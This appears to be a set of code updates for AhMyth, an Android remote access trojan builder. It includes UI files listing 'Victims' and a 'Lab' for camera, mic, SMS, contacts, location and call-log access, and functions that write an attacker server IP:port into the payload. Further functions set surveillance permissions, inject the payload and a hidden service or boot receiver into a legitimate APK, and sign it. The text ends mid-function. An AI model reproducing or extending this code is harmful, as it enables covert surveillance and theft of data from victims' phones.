## Updated App Controller for the `AppCtrl.js` file containing fixed maximize/restore button code
```javascript
app.controller("AppCtrl", ($scope) => {
  $appCtrl = $scope;
  $appCtrl.victims = viclist;
  $appCtrl.isVictimSelected = true;
  $appCtrl.bindApk = {
    enable: false, method: 'BOOT'
  }; //default values for binding apk

  var log = document.getElementById("log");

  $appCtrl.logs = [];

  $('.menu .item')
    .tab();
  $('.ui.dropdown')
    .dropdown();

  const window = remote.getCurrentWindow();
  $appCtrl.close = () => {
    window.close();
  };

  $appCtrl.minimize = () => {
    window.minimize();
  };

  $appCtrl.maximize = () => {
    if (window.isMaximized()) {
      window.unmaximize(); // Restore the window size
    } else {
      window.maximize(); // Maximize the window
    }
  };
```
## Updated App Controller for the `LabCtrl.js` file containing new maximize/restore button code
```javascript
app.controller("LabCtrl", function ($scope, $rootScope, $location) {
    $labCtrl = $scope;
    var log = document.getElementById("logy");
    $labCtrl.logs = [];

    const window = remote.getCurrentWindow();
    $labCtrl.close = () => {
        window.close();
    };

    $labCtrl.maximize = () => {
        if (window.isMaximized()) {
            window.unmaximize(); // Restore the window size
        } else {
            window.maximize(); // Maximize the window
        }
    };
```
## `clearLogs` function for the `AppCtrl.js` file as well as the 2 of the `*.html` files below
```javascript
  // function to clear the logs each time a button is clicked,
  // this is done to keep things clean.
  $appCtrl.clearLogs = () => {
    if ($appCtrl.logs.length !== 0) {
      $appCtrl.logs = [];
    }
  }
```

## Updated `index.html` file with correct log screen height & `clearLogs()` function
```html
<!DOCTYPE html>
<html ng-app="myapp">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no" />

    <title>AhMyth</title>

    <!-- Insert this line above script imports  -->
    <script>
        if (typeof module === 'object') {
            window.module = module;
            module = undefined;
        }
    </script>


    <script type="text/javascript" src="assets/js/lib/jquery-3.1.1.min.js"></script>
    <script type="text/javascript" src="../node_modules/fomantic-ui/dist/semantic.min.js"></script>
    <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
    <script type="text/javascript" src="assets/js/controllers/AppCtrl.js"></script>
    <!-- Insert this line after script imports -->
    <script>
        if (window.module) module = window.module;
    </script>

    <link rel="stylesheet" href="assets/css/mystyle.css">
    <link rel="stylesheet" href="../node_modules/fomantic-ui/dist/semantic.min.css" />
    <style>
        #log {
            height: 198px; /* Adjust the height value as per your preference */
            overflow: scroll;
        }
    </style>

</head>

<body ng-controller="AppCtrl" class="draggable">

    <div class="ui top attached tabular menu">
        <a class="item active notDraggable" data-tab="first"><i class="large eye icon"></i>Victims</a>
        <a class="item notDraggable" data-tab="second"><i class="large green android icon"></i>APK Builder</a>
        <a class="item notDraggable" data-tab="third"><i class="large blue cloud icon"></i>Payload Url Masker</a>
        <div class="ui right mini text menu notDraggable">
            <button class=" ui circular orange button" ng-click="minimize()" style="font-size: 6px;height: 17px"></button>
            <button class="ui circular green button" ng-click="maximize()" style="font-size: 6px;height: 17px"></button>
            <button class="ui circular red button" ng-click="close()" style="font-size: 6px;height: 17px"></button>
        </div>
    </div>

    <div class="ui bottom attached tab segment active h60 notDraggable" data-tab="first">
        <div class="ui grid h100">
            <div class="row h30">
                <div class="column">
                    <div class="ui horizontal segments">
                        <div class="ui segment">
                            <h2 class="ui left floated header">
                                <img class="ui image" src="assets/img/VictimsLab.png">
                                <div class="content">
                                    VICTIMS LAB
                                </div>
                            </h2>
                        </div>
                        <div class="ui center aligned segment">
                            <div style="line-height: 70px">
                                <div class="ui right floated labeled input">
                                    <div class="ui label">
                                        Port
                                    </div>
                                    <input type="text" ng-model="port" placeholder="Default is 42474">
                                </div>
                                <button ng-click="clearLogs(); isListen=true;Listen(port)" class="ui labeled icon black button"><i class="terminal icon"></i>Listen</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row h75" style="overflow: scroll;">
                <div class="column">
                    <table class="ui table single line selectable">
                        <thead>
                            <tr>
                                <th></th>
                                <th>Country</th>
                                <th>Manuf.</th>
                                <th>Model</th>
                                <th>Release</th>
                                <th>IP</th>
                                <th>Port</th>
                                <th></th>
                            </tr>
                        </thead>

                        <tbody>

                            <tr ng-repeat="(key, victim) in victims">
                                <td><a class="ui black ribbon label" ng-click="openLab(key)">Open The Lab</a></td>
                                <td ng-if="victim.country != null"><i class="{{victim.country}} flag"></i></td>
                                <td ng-if="victim.country == null"><i class="help circle icon"></i></td>
                                <td ng-bind="victim.manf"></td>
                                <td ng-bind="victim.model"></td>
                                <td ng-bind="victim.release"></td>
                                <td ng-bind="victim.ip"></td>
                                <td ng-bind="victim.port"></td>
                                <td></td>
                            </tr>

                        </tbody>
                    </table>
                </div>
            </div>

        </div>
    </div>

    <div class="ui bottom attached tab segment h60 notDraggable" data-tab="second">
        <div ng-include="'views/build.html'" class="full"></div>
    </div>

    <div class="ui bottom attached tab segment h60 notDraggable" data-tab="third">
        <div ng-include="'views/unavailable.html'" class="full"></div>
    </div>

    <div class="ui bottom attached black message notDraggable" id="log">
        <div ng-repeat="log in logs" class="log">
            <div class="w30" style="display: inline-block" ng-bind="log.date"></div>
            <div class="w65" style="display: inline-block" ng-style="{'color':log.color}" ng-bind="log.msg"></div>
        </div>
    </div>

</body>

</html>
```
## Updated `lab.html` file with correct log screen height & maximize/restore button
```html
<!DOCTYPE html>
<html ng-app="myappy">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no" />
    <title>Lab</title>
    <script>
        if (typeof module === 'object') {
            window.module = module;
            module = undefined;
        }
    </script>


    <script type="text/javascript" src="assets/js/lib/jquery-3.1.1.min.js"></script>
    <script type="text/javascript" src="../node_modules/fomantic-ui/dist/semantic.min.js"></script>
    <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
    <script type="text/javascript" src="../node_modules/angular-route/angular-route.min.js"></script>
    <script type='text/javascript' src='assets/js/lib/ng-infinite-scroll.min.js'></script>
    <script type="text/javascript" src="assets/js/lib/leaflet.js"></script>
    <script type="text/javascript" src="assets/js/controllers/LabCtrl.js"></script>


    <!-- Insert this line after script imports -->
    <script>
        if (window.module) module = window.module;
    </script>

    <link rel="stylesheet" href="assets/css/mystyle.css">
    <link rel="stylesheet" href="../node_modules/fomantic-ui/dist/semantic.min.css" />
    <link rel="stylesheet" href="assets/css/leaflet.css" />
    <style>
        #logy {
            height: 158px; /* Adjust the height value as per your preference */
            overflow: scroll;
        }
    </style>

</head>

<body ng-controller="LabCtrl" class="draggable">

    <div class="ui grid h80">
        <div class="row h10">
            <div class="sixteen wide column">
                <div class="ui inverted mini text labeled icon menu">
                    <a class="item">
                        <img src="assets/img/icon.png" /> </a>
                    <div class="right  menu notDraggable">
                        <button class="ui circular green button" ng-click="maximize()" style="font-size: 6px;height: 17px"></button>
                        <button class="ui circular red button" ng-click="close()" style="font-size: 6px;height: 17px"></button>
                    </div>
                </div>
            </div>
        </div>

        <div class="row h15 notDraggable">
            <div class="sixteen wide column">
                <div class="ui mini borderless labeled icon fluid seven item menu">
                    <a class="item" ng-click="goToPage('camera')">
                        <i class="red photo icon"></i> Camera
                    </a>
                    <a class="item" ng-click="goToPage('fileManager')">
                        <i class=" teal folder icon "></i> File Manager
                    </a>
                    <a class="item" ng-click="goToPage('mic')">
                        <i class="blue unmute icon "></i> Mic
                    </a>
                    <a class="item " ng-click="goToPage('location')">
                        <i class="violet marker icon "></i> Location
                    </a>
                    <a class="item " ng-click="goToPage('contacts')">
                        <i class="purple users icon "></i> contacts
                    </a>
                    <a class="item " ng-click="goToPage('smsManager')">
                        <i class="grey talk outline icon "></i> SMS
                    </a>
                    <a class="item " ng-click="goToPage('callsLogs')">
                        <i class="black call icon "></i> Calls Logs
                    </a>
                </div>

            </div>
        </div>




        <div class="row centered h75 notDraggable ">
            <div class="sixteen wide column">
                <div class="ui segment full">
                    <div ng-view class="full">
                    </div>
                </div>
            </div>
        </div>


    </div>
    <div class="ui bottom attached black message notDraggable " id="logy" style="overflow: scroll;">
        <div ng-repeat="log in logs " class="log ">
            <div class="w30 " style="display: inline-block " ng-bind="log.date "></div>
            <div class="w65 " style="display: inline-block " ng-style="{ 'color':log.color} " ng-bind="log.msg "></div>
        </div>
    </div>
</body>

</html>
```
## Updated `build.html` file with `clearLogs()` function
```html
<div class="ui segment h100">

    <table class="ui very compact table">
        <thead>
            <tr class="center aligned">
                <th colspan="2">APK Configuration</th>
            </tr>
        </thead>
        <tbody>
            <tr class="center aligned">
                <td>
                    <div class="ui labeled fluid input ">
                        <div class="ui black label">
                            Server IP
                        </div>
                        <input ng-model="srcIP" type="text" placeholder="188.132.xxx.xxx">
                    </div>
                </td>
                
                <td>
                    <div class="ui labeled fluid input ">
                        <input ng-model="srcPort" type="number" min="1025" max="65535" placeholder="default is 42474">
                            <div class="ui black label">
                                Server Port
                        </div>
                    </div>
                </td>
                                               
            </tr>
        </tbody>
    </table>
    <table class="ui very compact table">
        <thead>
            <tr class="center aligned">
                <th colspan="8">Permissions Customization</th>
            </tr>
        </thead>
        <tbody>
            <tr class="center aligned">
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions1" value="CameraPer">
                        <label>Camera</label>
                    </div>
                </td>
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions2" value="StoragePer">
                        <label>Storage</label>
                    </div>
                </td>
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions3" value="MicPer">
                        <label>Mic</label>
                    </div>
                </td> 
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions4" value="LocationPer">
                        <label>Location</label>
                    </div>
                </td> 
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions5" value="ContactsPer">
                        <label>Contacts</label>
                    </div>
                </td> 
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions6" value="SMSPer">
                        <label>SMS</label>
                    </div>
                </td> 
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions7" value="CallsLogsPer">
                        <label>CallsLogs</label>
                    </div>
                </td> 
            </tr>
        </tbody>
    </table>    
    <table class="ui very compact table">
        <thead>
            <tr class="center aligned">
                <th colspan="3">
                    <div class="ui checkbox ">
                        <input ng-model="bindApk.enable" type="checkbox" name="bind">
                        <label>Bind With An Original Apk</label>
                    </div>
                </th>
            </tr>
        </thead>
        <tbody ng-hide="!bindApk.enable">
            <tr class="center aligned">
                <td>
                    <div class="ui radio checkbox">
                        <input type="radio" name="method" checked="checked" ng-model="bindApk.method" value="BOOT">
                        <label>On boot</label>
                        <span style="font-size: 14px ;color: red">Device restart required</span>
                    </div>
                </td>
                <td>
                    <button ng-click="clearLogs(); BrowseApk()" ng-disabled="!bindApk.enable" class="ui black labeled icon button "><i class="android icon"></i>Browse Apk</button>
                    </td>
                <td>
                    <div class="ui radio checkbox">
                        <input type="radio" name="method" ng-model="bindApk.method" value="ACTIVITY">
                        <label>On Launch</label>
                        <span style="font-size: 14px ;color: red">Doesn't work on all apps</span>
                    </div>
                </td>
        </tbody>
        <tfoot class="half-width">
            <tr class="center aligned">
                <th colspan="3">
                    <button ng-click="clearLogs(); Build(srcIP,srcPort)" ng-hide="bindApk.enable" ng-show="Build" class="ui labeled icon red button"><i class="hammer icon" ></i>Build</button>
                    <button ng-click="clearLogs(); Build(srcIP,srcPort)" ng-hide="Build" ng-show=bindApk.enable class="ui labeled icon green button"><i class="screwdriver icon" ></i>Bind</button>
                </th>
            </tr>
        </tfoot>
    </table>
</div>
```
## Updated `GenerateApk` function with updated checkbox code
```js
  $appCtrl.GenerateApk = (apkFolder) => {

    var checkBoxofCamera = document.getElementById("Permissions1");
    var checkBoxofStorage = document.getElementById("Permissions2");
    var checkBoxofMic = document.getElementById("Permissions3");
    var checkBoxofLocation = document.getElementById("Permissions4");
    var checkBoxofContacts = document.getElementById("Permissions5");
    var checkBoxofSms = document.getElementById("Permissions6");
    var checkBoxofCallsLogs = document.getElementById("Permissions7");

    // default permissions for the payload
    const permissions = CONSTANTS.permissions;

    // Create an array to store the selected permissions
    var selectedPermissions = [];

    // Check each checkbox and add the corresponding permission to the selectedPermissions array
    if (checkBoxofCamera.checked) {
      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
    }
    if (checkBoxofStorage.checked) {
      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
    }
    if (checkBoxofMic.checked) {
      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
    }
    if (checkBoxofLocation.checked) {
      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
    }
    if (checkBoxofContacts.checked) {
      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
    }
    if (checkBoxofSms.checked) {
      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
    }
    if (checkBoxofCallsLogs.checked) {
      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
    }

    // If all checkboxes are checked, set selectedPermissions to the permissions array from CONSTANTS
    if (
      checkBoxofCamera.checked &&
      checkBoxofStorage.checked &&
      checkBoxofMic.checked &&
      checkBoxofLocation.checked &&
      checkBoxofContacts.checked &&
      checkBoxofSms.checked &&
      checkBoxofCallsLogs.checked
    ) {
      selectedPermissions = permissions;
    }

    // If all checkboxes are unchecked, set selectedPermissions to an empty array
    if (
      !checkBoxofCamera.checked &&
      !checkBoxofStorage.checked &&
      !checkBoxofMic.checked &&
      !checkBoxofLocation.checked &&
      !checkBoxofContacts.checked &&
      !checkBoxofSms.checked &&
      !checkBoxofCallsLogs.checked
    ) {
      selectedPermissions = permissions;
    }
    
    fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
      // Parse the XML data
      xml2js.parseString(data, (parseError, parsedData) => {
        if (parseError) {
          throw parseError;
        }

        // Remove existing permissions and features
        parsedData.manifest['uses-permission'] = [];
        parsedData.manifest['uses-feature'] = [];

        // Add new permissions and features based on selectedPermissions
        selectedPermissions.forEach(permission => {
          if (permission === 'android.hardware.camera') {
            parsedData.manifest['uses-feature'].push({
              $: {
                'android:name': 'android.hardware.camera'
              }
            });
          }

          if (permission === 'android.hardware.camera.autofocus') {
            parsedData.manifest['uses-feature'].push({
              $: {
                'android:name': 'android.hardware.camera.autofocus'
              }
            });
          }

          if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
            parsedData.manifest['uses-permission'].push({
              $: {
                'android:name': permission
              }
            });
          }
        });

        // Convert the parsed data back to XML
        const builder = new xml2js.Builder();
        const updatedData = builder.buildObject(parsedData);

        // Write the updated XML data back to the file
        fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'),
          updatedData,
          'utf8',
          (writeError) => {
            if (writeError) {
              throw writeError;
            }

          });
      });
    });

    // Empty the Apktool Framework Directory
    try {
      delayedLog('[★] Emptying the Apktool Framework Directory...');

      exec('java -jar "' + CONSTANTS.apktoolJar + '" empty-framework-dir --force "' + '"',
        (error,
          stderr,
          stdout) => {
          if (error) throw error;
        });
    } catch (error) {
      // Ignore the error by doing nothing
    }

    // Build the AhMyth Payload APK
    delayedLog('[★] Building ' + CONSTANTS.apkName + '...');

    var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath, CONSTANTS.apkName) + '" --use-aapt2 "' + '"',
      (error, stdout, stderr) => {
        if (error !== null) {
          delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
          WriteErrorLog(error, 'Building.log');
          delayedLog('[x] Building Error written to "Building.log" on...', CONSTANTS.logStatus.INFO);
          delayedLog(logPath, CONSTANTS.logStatus.INFO);
          return;
        }

        delayedLog('[★] Signing ' + CONSTANTS.apkName + '...');

        var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"',
          (error, stdout, stderr) => {
            if (error !== null) {
              delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
              WriteErrorLog(error, 'Signing.log');
              delayedLog('[x] Signing Error written to "Signing.log" on... ', CONSTANTS.logStatus.INFO);
              delayedLog(logPath, CONSTANTS.logStatus.INFO);
              return;
            }

            fs.unlink(dir.join(outputPath, CONSTANTS.apkName), (err) => {
              if (err) throw err;

              delayedLog('[✓] Apk built successfully', CONSTANTS.logStatus.SUCCESS);
              delayedLog('[✓] The apk has been built on ' + dir.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);

              fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                if (err) throw err;
              });
            });
          });
      });
  };
```
## Updated 'Constants.js' File w/ updated Permissions array and new permissions mapping for checkboxes
```javascript
var path = require("path");


//---------------------App Controller Vars----------------------------------
exports.apkName = 'Ahmyth.apk';
exports.apkSourceName = 'Ahmyth';
exports.signedApkName = 'Ahmyth-aligned-debugSigned.apk';
exports.ahmythApkFolderPath = path.join(__dirname, '..', '..', 'Factory/Ahmyth').replace("app.asar", "app.asar.unpacked");
exports.vaultFolderPath = path.join(__dirname, '..', '..', 'Factory/Vault').replace("app.asar", "app.asar.unpacked");
exports.apktoolJar = path.join(__dirname, '..', '..', 'Factory/apktool.jar').replace("app.asar", "app.asar.unpacked");
exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replace("app.asar", "app.asar.unpacked");
exports.maskUrlPython = path.join(__dirname, '..', '..', 'Factory/maskUrl.py').replace("app.asar", "app.asar.unpacked");
exports.dataDir = 'AhMyth'
exports.downloadPath = 'Downloads';
exports.outputApkPath = 'Output';
exports.outputLogsPath = 'Logs';
exports.logColors = { RED: "red", GREEN: "lime", YELLOW: "yellow", DEFAULT: "#82eefd" };
exports.logStatus = { SUCCESS: 1, FAIL: 0, INFO: 2 };
exports.defaultPort = 42474;
exports.IOSocketPath = 'smali' + path.sep + 'ahmyth' + path.sep + 'mine' + path.sep + 'king' + path.sep + 'ahmyth' + path.sep + 'e.smali';
exports.ahmythService = '<service android:enabled="true" android:exported="false" android:name="ahmyth.mine.king.ahmyth.MainService"/>';
exports.ahmythReciver = '<receiver android:enabled="true" android:exported="true" android:name="ahmyth.mine.king.ahmyth.MyReceiver">' +
  '<intent-filter>' +
  '<action android:name="android.intent.action.BOOT_COMPLETED"/>' +
  '</intent-filter>' +
  '</receiver>';
exports.serviceSrc = 'invoke-static {}, Lahmyth/mine/king/ahmyth/MainService'
exports.serviceStart = ';->start()V \n\n' +
  '    return-void';
exports.hookPoint = 'return-void';
exports.permissions = [
  'android.permission.WAKE_LOCK',
  'android.permission.CAMERA',
  'android.permission.READ_EXTERNAL_STORAGE',
  'android.permission.WRITE_EXTERNAL_STORAGE',
  'android.permission.MANAGE_EXTERNAL_STORAGE',
  'android.permission.WRITE_SETTINGS',
  'android.permission.WRITE_SECURE_SETTINGS',
  'android.permission.INTERNET',
  'android.permission.ACCESS_NETWORK_STATE',
  'android.permission.READ_SMS',
  'android.permission.SEND_SMS',
  'android.permission.RECEIVE_SMS',
  'android.permission.WRITE_SMS',
  'android.hardware.camera',
  'android.hardware.camera.autofocus',
  'android.permission.RECEIVE_BOOT_COMPLETED',
  'android.permission.READ_PHONE_STATE',
  'android.permission.READ_CALL_LOG',
  'android.permission.PROCESS_OUTGOING_CALLS',
  'android.permission.READ_CONTACTS',
  'android.permission.RECORD_AUDIO',
  'android.permission.MODIFY_AUDIO_SETTINGS',
  'android.permission.ACCESS_FINE_LOCATION',
  'android.permission.ACCESS_COARSE_LOCATION',
  'android.permission.ACCESS_BACKGROUND_LOCATION',
  'android.permission.REQUEST_IGNORE_BATTERY-OPTIMISATION'
];

exports.checkboxMap = {
  Permissions1: [
    'android.permission.CAMERA',
    'android.hardware.camera',
    'android.hardware.camera.autofocus',
  ],
  Permissions2: [
    'android.permission.READ_EXTERNAL_STORAGE',
    'android.permission.WRITE_EXTERNAL_STORAGE',
    'android.permission.MANAGE_EXTERNAL_STORAGE',
  ],
  Permissions3: [
    'android.permission.RECORD_AUDIO',
    'android.permission.MODIFY_AUDIO_SETTINGS',
  ],
  Permissions4: [
    'android.permission.ACCESS_FINE_LOCATION',
    'android.permission.ACCESS_COARSE_LOCATION',
    'android.permission.ACCESS_BACKGROUND_LOCATION',
  ],
  Permissions5: [
    'android.permission.READ_CONTACTS',
  ],
  Permissions6: [
    'android.permission.READ_SMS',
    'android.permission.SEND_SMS',
    'android.permission.RECEIVE_SMS',
    'android.permission.WRITE_SMS',
  ],
  Permissions7: [
    'android.permission.READ_PHONE_STATE',
    'android.permission.READ_CALL_LOG',
    'android.permission.PROCESS_OUTGOING_CALLS',
  ],
};

//---------------------Lab Controller Vars----------------------------------
exports.order = 'order';
exports.orders = {
  camera: 'x0000ca',
  fileManager: 'x0000fm',
  calls: 'x0000cl',
  sms: 'x0000sm',
  mic: 'x0000mc',
  location: 'x0000lm',
  contacts: 'x0000cn',

}
```
## Updated Build function
```javascript
  $appCtrl.Build = (ip, port) => {
    if (!ip) {
      $appCtrl.Log('[x] ' + 'IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
      return;
    }
    
    if (!port) {
      port = CONSTANTS.defaultPort;
    }
    
    if (port > 65535 || port <= 1024) {
      $appCtrl.Log('[x] ' + 'Choose ports from range (1024 - 65535)', CONSTANTS.logStatus.FAIL);
      return;
    }

    /*if (!$appCtrl.bindApk.enable) {
      var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
    }*/

    /* Opens the ahmyth payload source file and modifiies the ip and port to the users' ones for a bound payload. */
    /*if ($appCtrl.bindApk.enable) {
      var ipPortFile = dir.join(CONSTANTS.vaultFolderPath, CONSTANTS.IOSocketPath);
    }*/

    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
    delayedLog('[★] ' + 'Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
    fs.readFile(ipPortFile, 'utf8', (error, data) => {
      if (error) {
        $appCtrl.Log('[x] ' + 'Reading (IP:PORT) File Failed', CONSTANTS.logStatus.FAIL);
        WriteErrorLog(error, 'IP-PORT.log')
        $appCtrl.Log('[¡] ' + 'Error written to "IP-PORT.log" on...', CONSTANTS.logStatus.INFO)
        $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
        return;
      }

      // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
      var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali")
      delayedLog('[★] ' + 'Adding User IP:PORT Input to ' + CONSTANTS.apkSourceName + dir.sep + ipPortFilePath + '...');

      var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
      fs.writeFile(ipPortFile, result, 'utf8', (error) => {
        if (error) {
          $appCtrl.Log('[x] ' + 'Adding User IP:PORT Input Failed', CONSTANTS.logStatus.FAIL);
          WriteErrorLog(error, 'IP-PORT.log')
          $appCtrl.Log('[¡] ' + 'Error written to "IP-PORT.log" on...', CONSTANTS.logStatus.INFO)
          $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
          return;
        }

        // check if bind apk is enabled
        if (!$appCtrl.bindApk.enable) {
          $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
        } else {
          // generate a solid ahmyth apk
          var filePath = $appCtrl.filePath;
          if (filePath == null) {
            $appCtrl.Log('[x] ' + 'Browse for the Original APK you Want to Bind With', CONSTANTS.logStatus.FAIL);
            return;
          } else if (!filePath.includes(".apk")) {
            $appCtrl.Log('[x] ' + 'Sorry! This is not an APK file', CONSTANTS.logStatus.FAIL);
            return;
          }


          var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
          delayedLog('[★] ' + 'Decompiling ' + '"' + filePath.replace(/\\/g, "/").split("/").pop() + '"' + "...");

          var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
            (error, stdout, stderr) => {
              if (error !== null) {
                $appCtrl.Log('[x] ' + 'Decompiling Failed!', CONSTANTS.logStatus.FAIL);
                WriteErrorLog(error, 'Decompiling.log')
                $appCtrl.Log('[¡] ' + 'Decompiling Error written to "Decompiling.log" on...', CONSTANTS.logStatus.INFO)
                $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
                return;
              }

              if ($appCtrl.bindApk.method == 'BOOT')
                $appCtrl.BindOnBoot(apkFolder);

              else if ($appCtrl.bindApk.method == 'ACTIVITY')
                $appCtrl.BindOnLauncher(apkFolder);


            });
        }
      });
    });
  }
```
## new `CopyAhmythFilesAndGenerateApk` function
> contains new smali payload directory creator function
```js
$appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {

    delayedLog('[★] Copying AhMyth Payload Files to Original App...');
    delayedLog('[★] Reading the Original Decompiled APK...')
    fs.readdir(apkFolder, {
        withFileTypes: true
    }, (error, files) => {
        if (error) {
            delayedLog('[x] Reading the Decompiled APK Failed!', CONSTANTS.logStatus.FAIL)
            return;
        }
        
        var ignoreDirs = ['original',
            'res',
            'build',
            'kotlin',
            'lib',
            'assets',
            'META-INF',
            'unknown'];
        var smaliList = files
        .filter((item) => item.isDirectory() &&
            !(ignoreDirs.includes(item.name)))
        .map((item) => item.name);
        var collator = new Intl.Collator([], {
            numeric: true
        });
        smaliList.sort((a, b) => collator.compare(a, b));
        var lastSmali = smaliList[smaliList.length -1];
        if (lastSmali == "smali") {
        delayedLog('[★] Creating the new Smali Payload Directory...')

            fs.mkdir(apkFolder + "/smali_classes2", {
                recursive: true
            }, error => {
                if (error) {
                    delayedLog('[x] Unable to Create the Smali Payload Directory!', CONSTANTS.logStatus.FAIL);
                    return;
                };
                
                delayedLog('[★] Copying AhMyth Payload Files to Original App...');

                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"),
                    dir.join(apkFolder, "smali_classes2"), (error) => {
                        if (error) {
                            delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
                            WriteErrorLog(error, 'Copying.log');
                            delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                            delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }
                        
                        fs.rmdir(dir.join(apkFolder, 'smali_classes2', 'android'), {
                            recursive: true
                        });
                        fs.rmdir(dir.join(apkFolder, 'smali_classes2', 'androidx'), {
                            recursive: true
                        });

                        $appCtrl.GenerateApk(apkFolder);

                    });

            });

        } else {

            var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
            var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
            var newSmaliNumber = lastSmaliNumber+1;
            var payloadSmaliFolder = ('/smali_classes'+newSmaliNumber);
            delayedLog('[★] Creating the new Smali Payload Directory...')

            fs.mkdir(apkFolder + payloadSmaliFolder, {
                recursive: true
            }, error => {
                if (error) {
                    delayedLog('[x] Unable to Create the Smali Payload Directory!', CONSTANTS.logStatus.FAIL);
                    return;
                };

                delayedLog('[★] Copying AhMyth Payload Files to Original App...');

                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"),
                    dir.join(apkFolder, payloadSmaliFolder), (error) => {
                        if (error) {
                            delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
                            WriteErrorLog(error, 'Copying.log');
                            delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                            delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }
                        
                        fs.rmdir(dir.join(apkFolder, payloadSmaliFolder, 'android'), {
                            recursive: true
                        });
                        fs.rmdir(dir.join(apkFolder, payloadSmaliFolder, 'androidx'), {
                            recursive: true
                        });

                        $appCtrl.GenerateApk(apkFolder);

                    });

            });

        };

    });

};
```



## Updated `BindOnLauncher` function
```js
$appCtrl.BindOnLauncher = (apkFolder) => {
    delayedLog('[★] Reading the Android Manifest File...\n');
    fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
        if (error) {
            delayedLog('[x] Reading the Android Manifest file Failed!\n');
            return;
        }

        delayedLog('[★] Modifying the Android Manifest File...\n');
        const ahmythService = CONSTANTS.ahmythService;
        const permManifest = $appCtrl.copyPermissions(data);
        const newManifest = permManifest.substring(0, permManifest.indexOf('</application>')) + ahmythService
        + permManifest.substring(permManifest.indexOf('</application>'));
        fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), newManifest, 'utf8', (error) => {
            if (error) {
                delayedLog('[x] Modifying the Android Manifest Failed!\n', error);
                return;
            }

            xml2js.parseString(data, (err, result) => {
                if (err) {
                    delayedLog('[x] ' + err);
                    return;
                }

                delayedLog('[★] Searching for a Hookable Main Class in the Android Manifest...\n')
                const launcherActivity = GetLauncherActivity(result, apkFolder);
                if (launcherActivity === -1) {
                    delayedLog('[x] Cannot Find a Suitable Class for Hooking in the Manifest!');
                    delayedLog('[x] Please use Another APK as a Template!.\n');
                    return;
                }

                delayedLog('[★] Locating the Hookable Main Class File...\n');
                const launcherPath = GetLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
                    if (err) {
                        delayedLog('[x] Unable to Locate the Hookable Main Class File!');
                        delayedLog('[x] Please Use the "On Boot" Method!\n');
                        return;
                    } else {
                        delayedLog('[¡] Hookable Main Class File Found: ' + launcherPath + '\n');
                    }


                    delayedLog('[★] Reading the Hookable Main Class File...\n');
                    fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Unable to Read the Hookable Main Class File!\n');
                            return;
                        }

